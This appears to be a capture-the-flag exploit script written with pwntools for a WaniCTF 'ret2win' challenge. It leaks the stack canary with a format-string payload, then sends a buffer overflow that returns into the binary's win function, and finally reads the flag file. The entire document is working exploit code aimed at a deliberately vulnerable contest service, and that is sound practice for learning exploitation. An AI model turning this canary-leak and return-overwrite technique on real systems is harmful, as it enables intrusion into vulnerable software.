from pwn import *

# p = process('./chall')
elf = ELF('./chall')
p = remote('ret2win-pwn.wanictf.org', 9006)

payload = b'%9$p'
p.sendline(payload)
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)

ret_addr = 0x000000000040101a
payload = b'YES'.ljust(24, b'\00') + p64(canary) + p64(0x1) + p64(ret_addr) + p64(elf.sym['win'])
p.sendline(payload)
p.sendline(b'cat FLAG')

p.interactive()
